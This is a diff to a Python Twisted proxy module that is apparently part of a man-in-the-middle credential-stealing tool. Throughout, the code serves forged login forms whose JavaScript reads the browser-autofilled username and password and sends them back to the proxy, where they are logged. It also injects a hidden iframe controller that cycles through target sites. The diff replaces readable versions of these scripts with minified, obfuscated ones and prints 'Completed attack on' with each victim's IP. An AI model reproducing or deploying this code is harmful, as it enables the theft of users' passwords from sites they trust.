@@ -17,6 +17,7 @@ class ClientRequest(Request):
         self.reactor       	     = reactor
         self.PersistentData      = PersistentData.getInstance()
    
+  
     def lupinRequest(self,host):
         return defer.succeed(host)
 
@@ -26,9 +27,7 @@ class ClientRequest(Request):
         else:
             return reactor.resolve(host)
 
-    def errorResolvingHost(self, error):
-        #self.setResponseCode(404, "Not Found")
-        #self.setHeader("Connection", "close")  
+    def errorResolvingHost(self, error): 
         self.shutDown()
 
     def process(self):
@@ -58,21 +57,16 @@ class ClientRequest(Request):
             return
 
         if self.PersistentData._LUPIN_TOKEN+self.PersistentData._BOUNTY in path:
-            self.saveBounty()	
+            k 	= path.find(self.PersistentData._LUPIN_TOKEN)
+            print path[k+len(self.PersistentData._LUPIN_TOKEN)+2:]
             self.sendMoveSlaveSrc()
             return
 
         if self.PersistentData._LUPIN_TOKEN+self.PersistentData._DESTRUCT in path:
-            self.sendSelfDestruct()
-            #self.PersistentData.addVictim(self.getClientIP())
+            client = self.getClientIP()
+            self.sendTearDown(client)
+            #self.PersistentData.addVictim(client)
             return
-
-        '''
-        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._ALIVE in path:
-            self.sendAlive()
-            #self.PersistentData.addVictim(self.getClientIP())
-            return				
-        '''
 
     def processUserRequest(self, address):
         host              = self.getHeader("host")
@@ -133,15 +127,8 @@ class ClientRequest(Request):
         connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
         connectionFactory.protocol = ServerConnection
         self.reactor.connectTCP(host, 80, connectionFactory)
-      
+     
 
-    def saveBounty(self):
-        path 	= self.getPath()
-        k 	= path.find(self.PersistentData._LUPIN_TOKEN)
-        print path[k+len(self.PersistentData._LUPIN_TOKEN)+2:]
-        bounty = open("bounty.txt",'a');
-        #bounty.write(path[k+16:]+'\n')
-        bounty.close()
 
     def sendMoveSlaveSrc(self):
         self.setResponseCode(200, "OK")
@@ -159,49 +146,27 @@ class ClientRequest(Request):
 
 
 
-    def sendSelfDestruct(self):
+    def sendTearDown(self, client):
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "close") 
-        self.write("<html><head><script type='text/javascript'>window.parent.postMessage('selfDestruct','*'); </script></head><body></body></html>")
+        self.write("<html><head><script type='text/javascript'>window.parent.postMessage('_td_','*');</script></head><body></body></html>")
         self.shutDown()   
-        print "DONE!!!" 
-
-
+        print "Completed attack on "+client
+   
+     
     def sendForgedResponse(self,host):
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "close")   
         action = self.PersistentData.loginActions[host]
-        data = "<html><head></head><body> \
-                <form method='POST' action="+action+"> \
-                    <input type='text' name='user'/> \
-                    <input type='password' name='pass'/> \
-                </form> \
-                <script type='text/javascript'> \
-                    function steal(){ \
-                        user=document.getElementsByName('user')[0].value; \
-                        pass=document.getElementsByName('pass')[0].value; \
-                        host=location.hostname; \
-                        if(pass.length > 0){ \
-                            src = '?"+self.PersistentData._LUPIN_TOKEN+self.PersistentData._BOUNTY+"='+host+'|'+user+'|'+pass;\
-                            document.location.replace(src);\
-                        }else{ \
-                            window.parent.postMessage(window.name, '*'); \
-                        } \
-                    } \
-                    setTimeout('steal()',100); \
-                </script> \
-                </body></html>"
-        
+        data = "<html><head></head><body><form method='POST' action="+action+"><input type='text' name='user'/><input type='password' name='pass'/></form><script type='text/javascript'>function _a(){a=document.getElementsByName('user')[0].value;b=document.getElementsByName('pass')[0].value;c=location.hostname;if(b.length>0){d='?"+self.PersistentData._LUPIN_TOKEN+self.PersistentData._BOUNTY+"='+c+'|'+a+'|'+b;document.location.replace(d);}else window.parent.postMessage(window.name,'*');}setTimeout('_a()',100);</script></body></html>"
         self.write(data)
         self.shutDown()
      
-
+ 
     def sendMasterIframe(self):
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "keep-alive")
-        masterIframe_fd = open("Lupin/masterIframe.js",'r+')
-        masterIframe =  "<html><head><script type='text/javascript'>"+ self.PersistentData.masterIframeVars + masterIframe_fd.read()+"</script></head><body onload='init();'></body></html>"
-        masterIframe_fd.close()
+        masterIframe =  "<html><head><script type='text/javascript'>"+self.PersistentData.masterIframeVars+"var g1=0;var g2=10;var g3=new Array(g2);var g4=false;var g5=0;function _1(string){var a=string.split('.');var b='';for(var i=0;i<a.length;i++){var c=parseInt(a[i])+40;b+=String.fromCharCode(c);}return b;}function _2(a){var b='_sf'+a.toString();var c=document.getElementsByName(b)[0];var d=p8[g3[a]];if(g4)return;g3[a]+=g2;if(p3)d=_1(d);c.setAttribute('src','http://'+d+'?'+p0+p1);}function _3(a){var b=document.createElement('IFRAME');b.setAttribute('height','0');b.setAttribute('width','0');b.setAttribute('style','visibility:hidden;display:none');b.setAttribute('name','_sf'+a.toString());document.body.appendChild(b);}function _4(){if(p5==false&&g4)return;var a=g5;var b=new Date();g5=b.getTime();if(g5-a<p6)return;for(var j=0;j<g2;j++)if(g3[j]<p8.length)_2(j);}function _5(a){var b=a.data;if(b.indexOf('focus')!=-1){if(p4==false)g4=true;return;}if(b.indexOf('blur')!=-1){if(p4==false){g4=false;if(p6<10000)setTimeout('_4()',10000);else setTimeout('_4()',p6);}return;}g1+=1;if(g1==p8.length){document.location.replace(document.location.hostname+'?'+p0+p2);return;}var c=parseInt(b.substring(3));if(g4==true||g3[c]>=p8.length)return;var d=new Date();if(d.getTime()-g5<p7)_2(c);else if(p5==true){p5=false;g4=true;}else setTimeout('_4()',p6);}function _6(){for(var k=0;k<g2;k++){g3[k]=k;_3(k);}if(p4==true||p5==true)_4();window.addEventListener('message',_5,false);}</script></head><body onload='_6();'></body></html>"
         self.write(masterIframe)
         self.shutDown()
 		
